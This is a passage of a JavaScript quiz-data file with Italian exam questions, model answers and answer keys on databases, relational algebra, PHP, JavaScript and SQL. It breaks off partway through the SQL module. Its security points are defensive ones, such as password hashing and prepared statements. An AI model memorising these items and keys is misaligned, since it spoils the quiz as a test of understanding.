/* =========================================================================
   quiz-data.js — Domande d'esame Informatica · 6 moduli
   Domande raccolte e adattate dal programma svolto (a.s. 2025-26)
   Tipi: mc = scelta multipla, tf = vero/falso, open = domanda aperta
   ========================================================================= */

window.QUIZ_DATA = {

  /* ══════════════════════════════════════════════════════════════
     MODULO 1 — Basi di Dati e Algebra Relazionale
  ══════════════════════════════════════════════════════════════ */
  "basi-di-dati": [
    {
      id: 1, type: "open", topic: "DBMS",
      text: "Che cos'è un DBMS e quali funzioni principali svolge?",
      modelAnswer: "Un DBMS (Database Management System) è un sistema software che gestisce la creazione, l'organizzazione e l'interrogazione di basi di dati. Funzioni principali: definizione della struttura dei dati (DDL), manipolazione dei dati (DML), controllo degli accessi e sicurezza, garanzia dell'integrità e consistenza dei dati, gestione delle transazioni (atomicità, consistenza, isolamento, durabilità — ACID), recupero da guasti.",
      keywords: ["DBMS", "DDL", "DML", "integrità", "transazioni", "controllo accessi"]
    },
    {
      id: 2, type: "open", topic: "Sistemi",
      text: "Spiega la differenza tra sistema informatico e sistema informativo.",
      modelAnswer: "Il sistema informativo è l'insieme di risorse (umane, organizzative, tecnologiche e procedurali) dedicate alla raccolta, elaborazione, archiviazione e distribuzione delle informazioni all'interno di un'organizzazione. Il sistema informatico è la componente tecnologica del sistema informativo: l'insieme di hardware e software che realizza le funzioni di gestione delle informazioni. Il sistema informatico è quindi un sottoinsieme del sistema informativo.",
      keywords: ["sistema informativo", "sistema informatico", "risorse", "hardware", "software", "sottoinsieme"]
    },
    {
      id: 3, type: "open", topic: "ANSI/SPARC",
      text: "Descrivi l'architettura ANSI/SPARC a tre livelli.",
      modelAnswer: "L'architettura ANSI/SPARC separa la gestione dei dati in tre livelli: 1) Livello esterno (viste): ogni utente/applicazione vede solo la parte di dati di sua pertinenza. 2) Livello logico/concettuale (schema globale): descrive la struttura dell'intero database in modo indipendente dall'implementazione fisica. 3) Livello fisico/interno: descrive come i dati sono fisicamente memorizzati su disco. I livelli sono separati da due strati di indipendenza: logica e fisica.",
      keywords: ["livello esterno", "livello logico", "livello fisico", "indipendenza", "schema"]
    },
    {
      id: 4, type: "mc", topic: "Chiavi",
      text: "Quale delle seguenti affermazioni sulla chiave primaria è CORRETTA?",
      options: [
        "Può contenere valori NULL",
        "Non può contenere valori NULL ed è unica per ogni tupla",
        "È uguale alla chiave esterna",
        "Può essere duplicata se i valori sono diversi"
      ],
      correct: 1,
      explanation: "La chiave primaria identifica univocamente ogni tupla: non può contenere NULL e non può avere duplicati. È diversa dalla chiave esterna che referenzia un'altra tabella."
    },
    {
      id: 5, type: "open", topic: "Chiavi",
      text: "Definisci: superchiave, chiave candidata, chiave primaria e chiave esterna.",
      modelAnswer: "Superchiave: insieme di attributi che identifica univocamente ogni tupla (può contenere attributi in eccesso). Chiave candidata: superchiave minimale — non si può rimuovere nessun attributo senza perdere l'unicità. Chiave primaria: la chiave candidata scelta come identificatore principale; non può essere NULL. Chiave esterna: attributo (o insieme di attributi) che referenzia la chiave primaria di un'altra relazione, realizzando l'integrità referenziale.",
      keywords: ["superchiave", "chiave candidata", "minimale", "chiave primaria", "chiave esterna", "integrità referenziale"]
    },
    {
      id: 6, type: "tf", topic: "NULL",
      text: "Il valore NULL in un database relazionale equivale al valore zero in un campo numerico.",
      options: ["Vero", "Falso"],
      correct: 1,
      explanation: "FALSO. NULL indica l'assenza di informazione o un valore sconosciuto. Non è zero, non è stringa vuota, non è false. Ha un trattamento speciale nelle query: si usa IS NULL e IS NOT NULL."
    },
    {
      id: 7, type: "open", topic: "Vincoli",
      text: "Spiega i vincoli intra-relazionali e inter-relazionali con esempi.",
      modelAnswer: "Vincoli intra-relazionali: riguardano una singola relazione. Includono: vincoli di dominio (tipo/range degli attributi), vincoli di chiave (unicità della PK), vincoli di NOT NULL. Es. nella tabella Studenti, il voto deve essere compreso tra 18 e 30. Vincoli inter-relazionali: riguardano più relazioni. Il principale è il vincolo di integrità referenziale: una chiave esterna deve riferirsi a un valore effettivamente presente come chiave primaria nell'altra tabella. Es. l'IdCorso in Iscrizioni deve esistere in Corsi.",
      keywords: ["intra-relazionale", "inter-relazionale", "dominio", "integrità referenziale", "chiave esterna"]
    },
    {
      id: 8, type: "open", topic: "Vincoli",
      text: "Descrivi le regole di cancellazione in presenza di vincolo di integrità referenziale (CASCADE, RESTRICT, SET NULL).",
      modelAnswer: "Quando si tenta di cancellare un record padre referenziato da figli, si applicano regole: CASCADE — la cancellazione si propaga automaticamente ai record figli (pericoloso, usare con cautela). RESTRICT (o NO ACTION) — la cancellazione è bloccata se esistono figli che la referenziano. SET NULL — la chiave esterna nei figli viene impostata a NULL (se ammesso). SET DEFAULT — la FK viene impostata al valore di default. Le stesse regole si applicano per le modifiche (ON UPDATE).",
      keywords: ["CASCADE", "RESTRICT", "SET NULL", "ON DELETE", "ON UPDATE", "propagazione"]
    },
    {
      id: 9, type: "open", topic: "Algebra Relazionale",
      text: "Cos'è l'algebra relazionale? Descrivi la differenza tra operatori insiemistici e operatori relazionali.",
      modelAnswer: "L'algebra relazionale è un linguaggio formale procedurale per interrogare basi di dati relazionali. Operatori insiemistici (richiedono relazioni compatibili — stesso schema): Unione (∪), Intersezione (∩), Differenza (−), Prodotto cartesiano (×). Operatori relazionali (specifici delle basi di dati): Selezione (σ) — filtra righe, Proiezione (π) — seleziona colonne, Join (⋈) — combina relazioni, Ridenominazione (ρ) — rinomina attributi. L'algebra relazionale è alla base di SQL.",
      keywords: ["algebra relazionale", "selezione", "proiezione", "join", "unione", "differenza", "operatori"]
    },
    {
      id: 10, type: "mc", topic: "Algebra Relazionale",
      text: "L'operazione di proiezione (π) in algebra relazionale:",
      options: [
        "Filtra le righe della relazione secondo una condizione",
        "Seleziona un sottoinsieme di colonne della relazione",
        "Combina due relazioni sulla base di un attributo comune",
        "Elimina tutti i duplicati dalla relazione"
      ],
      correct: 1,
      explanation: "La proiezione π(colonne)(Relazione) seleziona un sottoinsieme di colonne (attributi), riducendo verticalmente la relazione. La selezione σ filtra invece le righe."
    },
    {
      id: 11, type: "open", topic: "Algebra Relazionale",
      text: "Come si collega l'algebra relazionale al linguaggio SQL? Elenca le corrispondenze principali.",
      modelAnswer: "SQL è basato sull'algebra relazionale ma è dichiarativo (si specifica COSA, non COME). Corrispondenze: σ (selezione righe) → clausola WHERE; π (proiezione colonne) → clausola SELECT; ⋈ (join) → clausola FROM con JOIN; ∪ (unione) → UNION; − (differenza) → NOT IN / EXCEPT; × (prodotto cartesiano) → FROM senza condizione di join; GROUP BY + funzioni aggregate → non ha corrispondente diretto in algebra classica.",
      keywords: ["SELECT", "WHERE", "JOIN", "UNION", "algebra relazionale", "dichiarativo"]
    },
    {
      id: 12, type: "tf", topic: "Relazioni",
      text: "La cardinalità di una relazione indica il numero di attributi (colonne) della relazione.",
      options: ["Vero", "Falso"],
      correct: 1,
      explanation: "FALSO. La cardinalità indica il numero di tuple (righe). Il numero di attributi (colonne) si chiama GRADO della relazione."
    },
    {
      id: 13, type: "mc", topic: "Vincoli",
      text: "Quale tra i seguenti NON è un vincolo di integrità in un database relazionale?",
      options: [
        "Vincolo di chiave primaria",
        "Vincolo di integrità referenziale",
        "Vincolo di dominio",
        "Vincolo di ottimizzazione delle query"
      ],
      correct: 3,
      explanation: "I vincoli di integrità sono: vincolo di chiave, integrità referenziale, vincolo di dominio, NOT NULL, UNIQUE, CHECK. L'ottimizzazione delle query non è un vincolo di integrità."
    },
    {
      id: 14, type: "open", topic: "Relazioni",
      text: "Definisci grado e cardinalità di una relazione. Spiega anche cosa si intende per schema e istanza.",
      modelAnswer: "Grado: numero di attributi (colonne) di una relazione — è fisso e definito nello schema. Cardinalità: numero di tuple (righe) presenti nell'istanza attuale — varia nel tempo con le operazioni DML. Schema: la struttura della relazione (nome + lista attributi + domini). È il 'progetto' della tabella, relativamente stabile. Istanza: il contenuto effettivo della relazione in un dato momento — l'insieme delle tuple attualmente presenti.",
      keywords: ["grado", "cardinalità", "schema", "istanza", "attributi", "tuple"]
    },
    {
      id: 15, type: "mc", topic: "Join",
      text: "Il join naturale combina due relazioni:",
      options: [
        "Su tutti gli attributi delle due relazioni",
        "Sugli attributi con lo stesso nome e dominio, eliminando i duplicati",
        "Producendo il prodotto cartesiano delle due relazioni",
        "Solo sulle chiavi primarie"
      ],
      correct: 1,
      explanation: "Il join naturale combina le tuple che hanno lo stesso valore negli attributi con lo stesso nome e dominio compatibile, eliminando una copia degli attributi di giunzione."
    }
  ],

  /* ══════════════════════════════════════════════════════════════
     MODULO 2 — PHP lato server
  ══════════════════════════════════════════════════════════════ */
  "php": [
    {
      id: 1, type: "open", topic: "Architettura",
      text: "Descrivi l'architettura client/server e il ruolo di PHP al suo interno.",
      modelAnswer: "Nell'architettura client/server, il client (browser) invia richieste HTTP al server web. PHP è un linguaggio lato server: il codice PHP viene eseguito dal server (es. Apache + PHP) che elabora la richiesta, interagisce con il database MySQL, genera HTML dinamico e restituisce la risposta al browser. Il client vede solo l'HTML prodotto, non il codice PHP sorgente. Questo garantisce sicurezza e separazione della logica.",
      keywords: ["client", "server", "HTTP", "PHP", "server-side", "HTML dinamico", "database"]
    },
    {
      id: 2, type: "open", topic: "Variabili",
      text: "Spiega lo scope delle variabili in PHP e il concetto di variabili superglobali.",
      modelAnswer: "In PHP le variabili hanno scope locale per default: una variabile definita in una funzione non è accessibile fuori, e viceversa. Per accedere a variabili globali dentro una funzione si usa: global $var oppure $GLOBALS['var']. Le variabili superglobali sono invece accessibili ovunque, senza dichiarare global: $_GET (parametri URL), $_POST (dati form), $_SESSION (sessione), $_COOKIE (cookie), $_FILES (upload), $_SERVER (info server), $_REQUEST (GET+POST+COOKIE).",
      keywords: ["scope", "locale", "globale", "superglobali", "$_GET", "$_POST", "$_SESSION", "global"]
    },
    {
      id: 3, type: "mc", topic: "Superglobali",
      text: "In PHP, quale superglobale contiene i dati inviati tramite il metodo POST di un form HTML?",
      options: ["$_GET", "$_POST", "$_REQUEST", "$_SERVER"],
      correct: 1,
      explanation: "$_POST contiene i dati inviati con method='post'. $_GET contiene i dati nell'URL. $_REQUEST contiene GET+POST+COOKIE insieme (sconsigliato per sicurezza)."
    },
    {
      id: 4, type: "open", topic: "Strutture",
      text: "Descrivi le strutture di controllo disponibili in PHP con esempi.",
      modelAnswer: "Selezione: if/elseif/else, switch/case, operatore ternario (?:). Iterazione: for (indice noto), while (condizione), do-while (almeno una iterazione), foreach (array/oggetti). Break interrompe il ciclo, continue salta all'iterazione successiva. Esempio: foreach ($studenti as $id => $nome) { echo $id . ': ' . $nome; }",
      keywords: ["if", "switch", "for", "while", "foreach", "do-while", "break", "continue", "operatore ternario"]
    },
    {
      id: 5, type: "tf", topic: "Sintassi",
      text: "In PHP, i nomi delle variabili iniziano con il simbolo $.",
      options: ["Vero", "Falso"],
      correct: 0,
      explanation: "VERO. Tutte le variabili PHP iniziano con $: $nome, $eta, $_POST. Il nome della variabile è case-sensitive ($Eta e $eta sono variabili diverse)."
    },
    {
      id: 6, type: "open", topic: "Array",
      text: "Spiega la differenza tra array indicizzati e array associativi in PHP. Descrivi le principali funzioni sugli array.",
      modelAnswer: "Array indicizzati: chiavi numeriche progressive (default): $arr = [10, 20, 30]; $arr[0] = 10. Array associativi: chiavi stringa definite esplicitamente: $user = ['nome' => 'Mario', 'eta' => 20]. Funzioni principali: count() (dimensione), array_push/pop (aggiunta/rimozione), sort/asort/ksort (ordinamento), in_array() (ricerca), array_merge() (fusione), array_keys/values() (chiavi/valori), array_map/filter() (trasformazione/filtro), implode/explode() (conversione con/da stringa).",
      keywords: ["array indicizzato", "array associativo", "count", "sort", "array_push", "array_merge", "foreach"]
    },
    {
      id: 7, type: "open", topic: "Cookie e Sessioni",
      text: "Cosa sono i cookie e le sessioni in PHP? Quali differenze ci sono tra i due meccanismi?",
      modelAnswer: "Cookie: piccoli file di dati memorizzati sul client (browser), max ~4 KB. Persistenti tra sessioni. Creati con setcookie($nome, $valore, $scadenza). Accessibili con $_COOKIE. Sessioni: i dati sono memorizzati sul server in file temporanei; al client viene inviato solo il session_id (via cookie). Avviate con session_start(). Dati in $_SESSION. Automaticamente distrutte alla chiusura del browser (salvo configurazione). Le sessioni sono più sicure per dati sensibili; i cookie sono utili per preferenze persistenti (es. lingua, tema).",
      keywords: ["cookie", "sessione", "setcookie", "session_start", "$_COOKIE", "$_SESSION", "session_id", "client", "server"]
    },
    {
      id: 8, type: "mc", topic: "Sicurezza",
      text: "Quale funzione PHP si usa per creare un hash sicuro di una password?",
      options: ["md5()", "sha1()", "password_hash()", "crypt()"],
      correct: 2,
      explanation: "password_hash() usa bcrypt con salt automatico. md5() e sha1() sono obsoleti per le password (troppo veloci, vulnerabili). password_hash + password_verify è la coppia raccomandata."
    },
    {
      id: 9, type: "open", topic: "Autenticazione",
      text: "Come si implementa l'autenticazione utenti in PHP? Descrivi i passi principali, incluso l'hashing delle password.",
      modelAnswer: "Registrazione: ricevere email/password da form POST, validare input, creare hash con password_hash($pwd, PASSWORD_BCRYPT), salvare hash nel DB. Login: ricevere email/password, cercare l'utente nel DB per email, usare password_verify($input, $hash) per confrontare. Se corretto: session_start(), salvare dati utente in $_SESSION, redirect alla pagina protetta. Logout: session_destroy(). Proteggere le pagine riservate con session_start() e verifica di $_SESSION. Non salvare mai la password in chiaro nel DB.",
      keywords: ["password_hash", "password_verify", "session_start", "$_SESSION", "bcrypt", "hash", "autenticazione", "registrazione"]
    },
    {
      id: 10, type: "open", topic: "MySQLi",
      text: "Come si interagisce con MySQL in PHP tramite MySQLi? Descrivi i passi di una query tipica.",
      modelAnswer: "Connessione: $conn = mysqli_connect($host, $user, $pwd, $db) o new mysqli(). Verifica errore: if(!$conn) die(mysqli_connect_error()). Esecuzione query: $result = mysqli_query($conn, $sql). Lettura risultati: while($row = mysqli_fetch_assoc($result)) { ... }. Pulizia: mysqli_free_result($result). Chiusura: mysqli_close($conn). Per query con parametri utente: SEMPRE prepared statements — $stmt = $conn->prepare('SELECT * FROM t WHERE id=?'); $stmt->bind_param('i', $id); $stmt->execute();",
      keywords: ["mysqli_connect", "mysqli_query", "mysqli_fetch_assoc", "prepared statements", "bind_param", "execute", "mysqli_close"]
    },
    {
      id: 11, type: "open", topic: "Form",
      text: "Spiega la differenza tra GET e POST per la gestione dei form. Quando usare l'uno e quando l'altro?",
      modelAnswer: "GET: i dati vengono aggiunti all'URL come query string (?nome=valore). Visibili nell'URL, bookmarkable, memorizzati nella cronologia. Limite ~2 KB. Idempotente (ripetere non ha effetti). Usare per: ricerche, filtri, navigazione. POST: i dati vengono inviati nel body della richiesta HTTP. Non visibili nell'URL, non memorizzati nella cronologia. Nessun limite pratico di dimensione. Usare per: login, form con dati sensibili, upload file, operazioni che modificano dati sul server.",
      keywords: ["GET", "POST", "URL", "body", "idempotente", "dati sensibili", "$_GET", "$_POST"]
    },
    {
      id: 12, type: "mc", topic: "Form",
      text: "Quale metodo HTTP è preferibile per inviare credenziali di accesso (username e password)?",
      options: ["GET", "POST", "PUT", "HEAD"],
      correct: 1,
      explanation: "POST perché i dati vengono inviati nel body della richiesta HTTP, non nell'URL. Con GET le credenziali sarebbero visibili nell'URL, nei log del server e nella cronologia del browser."
    },
    {
      id: 13, type: "open", topic: "JSON",
      text: "Spiega come PHP gestisce il JSON: funzioni principali e casi d'uso tipici.",
      modelAnswer: "json_encode($var): converte array/oggetto PHP in stringa JSON. Opzioni: JSON_PRETTY_PRINT (formattazione leggibile), JSON_UNESCAPED_UNICODE (caratteri Unicode), JSON_UNESCAPED_SLASHES. json_decode($str, true): converte JSON in array associativo PHP (secondo parametro true) o in oggetto stdClass (false o omesso). Casi d'uso: risposta AJAX (PHP invia JSON al browser), API REST, configurazioni, scambio dati tra sistemi. Workflow tipico: PHP esegue query SQL → array PHP → json_encode() → risposta HTTP → JS riceve → JSON.parse() → aggiorna DOM.",
      keywords: ["json_encode", "json_decode", "AJAX", "array", "oggetto", "API", "scambio dati"]
    },
    {
      id: 14, type: "open", topic: "File",
      text: "Come si gestisce la lettura e scrittura di file in PHP? Elenca le funzioni principali.",
      modelAnswer: "Apertura: fopen($percorso, $modalità) — modalità: 'r' (lettura), 'w' (scrittura, tronca), 'a' (append), 'r+' (lettura+scrittura). Lettura: fgets() (riga per riga), fread($handle, $bytes) (n byte), file_get_contents() (tutto in stringa). Scrittura: fwrite($handle, $stringa), file_put_contents() (tutto da stringa, più semplice). Chiusura: fclose($handle). Controllo: file_exists(), is_readable(), is_writable(). file_get_contents e file_put_contents sono scorciatoie comode per operazioni semplici.",
      keywords: ["fopen", "fclose", "fgets", "fwrite", "file_get_contents", "file_put_contents", "modalità apertura"]
    },
    {
      id: 15, type: "tf", topic: "Sicurezza",
      text: "La funzione md5() è raccomandata per l'hashing delle password degli utenti in PHP.",
      options: ["Vero", "Falso"],
      correct: 1,
      explanation: "FALSO. md5() è troppo veloce e vulnerabile ad attacchi a dizionario e rainbow table. Per le password si usa password_hash() che implementa bcrypt con salt automatico."
    }
  ],

  /* ══════════════════════════════════════════════════════════════
     MODULO 3 — JavaScript lato client
  ══════════════════════════════════════════════════════════════ */
  "javascript": [
    {
      id: 1, type: "open", topic: "DOM",
      text: "Cos'è il DOM? Spiega come JavaScript interagisce con esso per modificare la pagina.",
      modelAnswer: "Il DOM (Document Object Model) è la rappresentazione ad albero della struttura HTML della pagina, creata dal browser in memoria. Ogni elemento HTML diventa un nodo dell'albero. JavaScript può: selezionare nodi (getElementById, querySelector), creare nuovi elementi (createElement), modificarli (innerHTML, textContent, setAttribute), aggiungerne al DOM (appendChild, insertBefore), rimuoverli (removeChild). Ogni modifica al DOM viene immediatamente riflessa nella pagina visualizzata, senza ricaricarla.",
      keywords: ["DOM", "Document Object Model", "nodo", "getElementById", "querySelector", "createElement", "appendChild"]
    },
    {
      id: 2, type: "open", topic: "Eventi",
      text: "Descrivi la gestione degli eventi in JavaScript. Spiega event bubbling e come usare addEventListener.",
      modelAnswer: "Gli eventi sono azioni che accadono nel browser (click, submit, keydown, load…). Per gestirli: elemento.addEventListener('evento', funzione) — aggiunge un handler senza sovrascrivere quelli esistenti. Event bubbling: quando un evento si verifica, si propaga dal nodo colpito verso i genitori (fino a document). Utile per la delegazione degli eventi: registrare un handler sul genitore invece che su ogni figlio. event.stopPropagation() ferma il bubbling. event.preventDefault() previene il comportamento default (es. submit del form).",
      keywords: ["addEventListener", "event bubbling", "event.stopPropagation", "event.preventDefault", "delegazione", "handler"]
    },
    {
      id: 3, type: "mc", topic: "DOM",
      text: "Quale metodo JavaScript restituisce l'elemento HTML con un determinato ID?",
      options: [
        "document.querySelector('#id')",
        "document.getElementById('id')",
        "document.getElement('id')",
        "document.findById('id')"
      ],
      correct: 1,
      explanation: "document.getElementById('id') restituisce direttamente l'elemento con quell'ID (più veloce). document.querySelector('#id') funziona anche ma è leggermente più lento perché usa il motore CSS."
    },
    {
      id: 4, type: "open", topic: "DOM",
      text: "Spiega come si crea e modifica dinamicamente il contenuto HTML con JavaScript.",
      modelAnswer: "Creazione: document.createElement('tag') crea un nuovo nodo. Si imposta il contenuto con textContent o innerHTML, gli attributi con setAttribute(). Si inserisce nel DOM con appendChild(genitore), insertBefore() o prepend(). Modifica: selezionare il nodo, poi modificare .textContent, .innerHTML, .style.*, classList.add/remove/toggle(), setAttribute(). Rimozione: elemento.remove() o genitore.removeChild(figlio). Esempio: const li = document.createElement('li'); li.textContent = 'Nuovo elemento'; lista.appendChild(li);",
      keywords: ["createElement", "appendChild", "textContent", "innerHTML", "setAttribute", "classList", "remove"]
    },
    {
      id: 5, type: "open", topic: "AJAX",
      text: "Cos'è AJAX? Descrivi il flusso completo di una chiamata asincrona con XMLHttpRequest.",
      modelAnswer: "AJAX (Asynchronous JavaScript And XML) permette di aggiornare parti di pagina senza ricaricarla, tramite richieste HTTP asincrone. Flusso con XMLHttpRequest: 1. const xhr = new XMLHttpRequest(); 2. xhr.open('GET', 'api.php?id=1', true); — metodo, URL, asincrono. 3. xhr.onreadystatechange = function() { if(xhr.readyState===4 && xhr.status===200) { const data = JSON.parse(xhr.responseText); aggiornaDom(data); } }; 4. xhr.send(); — per POST: xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded'); xhr.send('param=valore');",
      keywords: ["XMLHttpRequest", "open", "send", "readyState", "status 200", "responseText", "asincrono", "JSON.parse"]
    },
    {
      id: 6, type: "tf", topic: "AJAX",
      text: "Una chiamata AJAX richiede sempre il ricaricamento completo della pagina per mostrare i nuovi dati.",
      options: ["Vero", "Falso"],
      correct: 1,
      explanation: "FALSO. AJAX è progettato esattamente per l'opposto: aggiornare parti della pagina SENZA ricaricarla. Questa è la caratteristica fondamentale che rende le web app più veloci e reattive."
    },
    {
      id: 7, type: "open", topic: "JSON",
      text: "Spiega il formato JSON: struttura, conversione in JavaScript e scambio di dati con il server.",
      modelAnswer: "JSON (JavaScript Object Notation) è un formato testuale leggero per lo scambio di dati. Sintassi: oggetti con {chiave:valore}, array con [elem1,elem2], valori: string, number, boolean, null, array, object. Conversione JS: JSON.parse(stringa) converte JSON→oggetto JS. JSON.stringify(oggetto) converte oggetto JS→stringa JSON. Workflow AJAX: server PHP fa query SQL → array PHP → json_encode() → invia come response. JS riceve il testo → JSON.parse() → usa i dati per aggiornare il DOM. Nessuna logica eseguibile in JSON (niente funzioni).",
      keywords: ["JSON", "JSON.parse", "JSON.stringify", "oggetto", "array", "scambio dati", "AJAX"]
    },
    {
      id: 8, type: "mc", topic: "JSON",
      text: "Quale metodo JavaScript converte una stringa in formato JSON in un oggetto JavaScript?",
      options: [
        "JSON.stringify()",
        "JSON.parse()",
        "JSON.decode()",
        "JSON.convert()"
      ],
      correct: 1,
      explanation: "JSON.parse(str) converte una stringa JSON in un oggetto/array JavaScript. JSON.stringify(obj) fa il contrario: converte un oggetto in stringa JSON."
    },
    {
      id: 9, type: "open", topic: "Validazione",
      text: "Descrivi la validazione lato client dei form con JavaScript. Perché non è sufficiente da sola?",
      modelAnswer: "La validazione client-side con JavaScript controlla i dati inseriti dall'utente prima che vengano inviati al server: campi obbligatori, formato email, lunghezza minima/massima, pattern numerici. Migliora l'UX perché dà feedback immediato senza round-trip al server. Si può fare con HTML5 (required, pattern, min, max, type) o con JS su submit/blur. Tuttavia NON garantisce sicurezza: un utente malintenzionato può disabilitare JavaScript o inviare richieste HTTP dirette bypassando il browser. Serve SEMPRE la validazione server-side (PHP) come vera difesa.",
      keywords: ["validazione", "client-side", "JavaScript", "UX", "required", "pattern", "server-side", "sicurezza"]
    },
    {
      id: 10, type: "mc", topic: "DOM",
      text: "Quale evento JavaScript si attiva quando l'intero DOM è stato caricato (senza attendere immagini e CSS)?",
      options: [
        "window.onload",
        "document.ready",
        "DOMContentLoaded",
        "document.onload"
      ],
      correct: 2,
      explanation: "DOMContentLoaded si attiva quando il DOM è completamente costruito. window.onload aspetta anche immagini, CSS e altre risorse esterne. DOMContentLoaded è preferito per inizializzare script."
    },
    {
      id: 11, type: "open", topic: "Tabelle",
      text: "Descrivi come si costruisce e gestisce dinamicamente una tabella HTML con JavaScript.",
      modelAnswer: "Struttura: creare table, thead, tbody, tr, th, td con createElement. Inserire dati con textContent. appendChild per costruire la gerarchia. Esempio di costruzione: const table = document.createElement('table'); const tbody = document.createElement('tbody'); dati.forEach(riga => { const tr = document.createElement('tr'); Object.values(riga).forEach(v => { const td = document.createElement('td'); td.textContent = v; tr.appendChild(td); }); tbody.appendChild(tr); }); table.appendChild(tbody); container.appendChild(table). Per aggiornare: svuotare tbody.innerHTML='', poi ripopolarlo.",
      keywords: ["table", "tbody", "tr", "td", "createElement", "appendChild", "textContent", "forEach"]
    },
    {
      id: 12, type: "tf", topic: "Sintassi",
      text: "In JavaScript, gli array sono oggetti.",
      options: ["Vero", "Falso"],
      correct: 0,
      explanation: "VERO. In JavaScript gli array sono un tipo speciale di oggetto: typeof [] restituisce 'object'. Gli array ereditano da Array.prototype e hanno proprietà come length e metodi come push, pop, forEach, map, filter."
    },
    {
      id: 13, type: "open", topic: "Sintassi",
      text: "Spiega la differenza tra var, let e const in JavaScript con esempi pratici.",
      modelAnswer: "var: scope di funzione (non di blocco), subisce hoisting (la dichiarazione viene sollevata in cima alla funzione). Evitare nei progetti moderni. let: scope di blocco ({}), no hoisting problematico, riassegnabile. Usare per variabili che cambiano. const: scope di blocco, DEVE essere inizializzato alla dichiarazione, non riassegnabile (ma un oggetto const può avere proprietà modificate). Usare per costanti e riferimenti che non cambiano. Esempio: const MAX = 100; let count = 0; if(true){ let x = 5; } — x non esiste fuori dall'if.",
      keywords: ["var", "let", "const", "scope di blocco", "hoisting", "riassegnabile", "funzione"]
    },
    {
      id: 14, type: "open", topic: "Debugging",
      text: "Descrivi gli strumenti di debugging disponibili nei browser moderni per JavaScript.",
      modelAnswer: "Console: console.log() per stampare valori, console.error() per errori, console.table() per array/oggetti, console.time()/timeEnd() per misurare tempi. DevTools (F12): Pannello Elements (DOM live), Console (errori e log), Sources (codice con breakpoints — si clicca sul numero di riga per sospendere l'esecuzione), Network (richieste HTTP/AJAX con tempi, payload), Application (localStorage, sessionStorage, cookie). Debugger keyword nel codice sospende l'esecuzione come un breakpoint.",
      keywords: ["console.log", "DevTools", "breakpoint", "Sources", "Network", "Console", "debugger"]
    },
    {
      id: 15, type: "mc", topic: "Sintassi",
      text: "Quale tra le seguenti è la sintassi corretta per una funzione freccia (arrow function) in JavaScript?",
      options: [
        "function => (x) { return x * 2; }",
        "const doppio = (x) => x * 2;",
        "const doppio = x -> x * 2;",
        "arrow doppio(x) { return x * 2; }"
      ],
      correct: 1,
      explanation: "La sintassi delle arrow function è: const nome = (params) => espressione. Per un solo parametro le parentesi sono opzionali: x => x*2. Per più istruzioni servono le graffe con return."
    }
  ],

  /* ══════════════════════════════════════════════════════════════
     MODULO 4 — SQL
  ══════════════════════════════════════════════════════════════ */
  "sql": [
    {
      id: 1, type: "open", topic: "DDL/DML",
      text: "Spiega la differenza tra DDL e DML in SQL con esempi di comandi per ciascuno.",
      modelAnswer: "DDL (Data Definition Language): definisce la struttura del database. Comandi: CREATE TABLE (crea), ALTER TABLE (modifica struttura), DROP TABLE (elimina), TRUNCATE TABLE (svuota). Esempio: CREATE TABLE Studenti (id INT PRIMARY KEY AUTO_INCREMENT, nome VARCHAR(50) NOT NULL, voto INT CHECK(voto BETWEEN 18 AND 30)). DML (Data Manipulation Language): manipola i dati. Comandi: SELECT (legge), INSERT INTO (inserisce), UPDATE ... SET (modifica), DELETE FROM (cancella). Esempio: INSERT INTO Studenti(nome, voto) VALUES('Mario', 27).",
      keywords: ["DDL", "DML", "CREATE TABLE", "ALTER TABLE", "INSERT", "SELECT", "UPDATE", "DELETE"]
    },
    {
      id: 2, type: "open", topic: "SELECT",
      text: "Descrivi le clausole principali di una SELECT: WHERE, ORDER BY, GROUP BY, HAVING, LIMIT, DISTINCT.",
      modelAnswer: "SELECT [DISTINCT] colonne FROM tabella [WHERE condizione] [GROUP BY colonne] [HAVING condizione_gruppo] [ORDER BY colonne [ASC|DESC]] [LIMIT n]. WHERE: filtra righe prima del raggruppamento. GROUP BY: raggruppa righe con stesso valore. HAVING: filtra gruppi (dopo GROUP BY, può usare aggregati). ORDER BY: ordina il risultato (ASC default, DESC inverso). LIMIT n: restituisce al massimo n righe. DISTINCT: elimina duplicati. Esempio: SELECT categoria, COUNT(*) as totale FROM Prodotti WHERE prezzo > 10 GROUP BY categoria HAVING totale > 5 ORDER BY totale DESC LIMIT 3.",
      keywords: ["SELECT", "WHERE", "GROUP BY", "HAVING", "ORDER BY", "LIMIT", "DISTINCT", "ASC", "DESC"]
    },
    {
      id: 3, type: "mc", topic: "DDL",
      text: "Quale comando SQL elimina tutti i record di una tabella mantenendone la struttura e resettando AUTO_INCREMENT?",
      options: [
        "DELETE FROM tabella",
        "DROP TABLE tabella",
        "TRUNCATE TABLE tabella",
        "REMOVE FROM tabella"
      ],
      correct: 2,
      explanation: "TRUNCATE svuota la tabella rapidamente e azzera AUTO_INCREMENT. DELETE FROM senza WHERE rimuove tutte le righe ma è più lento e non azzera AUTO_INCREMENT. DROP elimina sia i dati che la struttura."
    },
    {
      id: 4, type: "open", topic: "JOIN",
      text: "Descrivi INNER JOIN, LEFT JOIN e la loro differenza con esempi.",
      modelAnswer: "INNER JOIN: restituisce solo le righe che hanno corrispondenza in ENTRAMBE le tabelle. SELECT * FROM Ordini INNER JOIN Clienti ON Ordini.id_cliente = Clienti.id. LEFT JOIN (LEFT OUTER JOIN): restituisce TUTTE le righe della tabella sinistra, e per quelle senza corrispondenza a destra i campi sono NULL. SELECT * FROM Clienti LEFT JOIN Ordini ON Clienti.id = Ordini.id_cliente — mostra anche i clienti senza ordini. RIGHT JOIN è speculare a LEFT JOIN. Usare LEFT JOIN quando si vuole mantenere tutte le righe della tabella principale anche senza corrispondenze.",
      keywords: ["INNER JOIN", "LEFT JOIN", "ON", "NULL", "corrispondenza", "tabella sinistra"]
    },
    {
      id: 5, type: "open", topic: "Subquery",
      text: "Cos'è una subquery? Descrivi la differenza tra subquery correlata e non correlata con esempi.",
      modelAnswer: "Una subquery è una SELECT annidata all'interno di un'altra query. Non correlata: la subquery è indipendente e viene eseguita una sola volta. SELECT nome FROM Studenti WHERE voto > (SELECT AVG(voto) FROM Studenti). Correlata: fa riferimento a colonne della query esterna, viene eseguita una volta per ogni riga esterna (più lenta). SELECT nome FROM Studenti s1 WHERE voto = (SELECT MAX(voto) FROM Studenti s2 WHERE s2.classe = s1.classe). Operatori con subquery: IN (valore nell'insieme), NOT IN, ANY, ALL, EXISTS.",
      keywords: ["subquery", "correlata", "non correlata", "IN", "EXISTS", "ANY", "ALL", "query annidata"]
